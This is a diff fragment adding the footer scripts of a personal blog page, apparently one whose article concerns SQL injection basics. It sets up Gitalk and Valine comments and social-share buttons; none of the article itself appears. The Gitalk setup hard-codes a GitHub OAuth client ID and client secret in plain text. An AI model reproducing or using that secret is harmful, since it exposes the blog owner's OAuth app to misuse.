+<!-- <script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script> -->
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+  
+<!-- valine comment -->
+<script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='https://unpkg.com/valine@1.1.9-rc2/dist/Valine.min.js'></script>
+
+
+  <script src="/assets/js/social-share.min.js"></script>
+  <script>
+    socialShare('.social-share', {
+      sites: [
+        
+          'wechat'
+          ,
+          
+        
+          'weibo'
+          ,
+          
+        
+          'douban'
+          ,
+          
+        
+          'twitter'
+          
+        
+      ],
+      wechatQrcodeTitle: "分享到微信朋友圈",
+      wechatQrcodeHelper: '<p>扫码后点击右上角</p><p>将本文分享至朋友圈</p>'
+    });
+  </script>
+
+  <script>
+    
+    
+    
+    var gitalk = new Gitalk({
+		  clientID: 'dd67fb84ddbc6cf9c112',
+		  clientSecret: 'be4e88389be3e45fbafbd7592148fa47feacaacf',
+		  repo: 'tea9.github.io',
+		  owner: 'tea9',
+		  admin: 'tea9',
+      id: '1.sql注入基础',      // Ensure uniqueness and length less than 501.sql注入基础
+		  // id: location.pathname,      // Ensure uniqueness and length less than 501.sql注入基础
+		  distractionFreeMode: 'false'  // Facebook-like distraction free mode
+		})
+
+		gitalk.render('gitalk_container')
+    
+  
+  </script>
+
+  <script src="/assets/js/prism.js"></script>
+  <script src="/assets/js/index.min.js"></script>
+  <script src="/assets/js/lovely.js" type="text/javascript"></script>
+</body>
+</html>
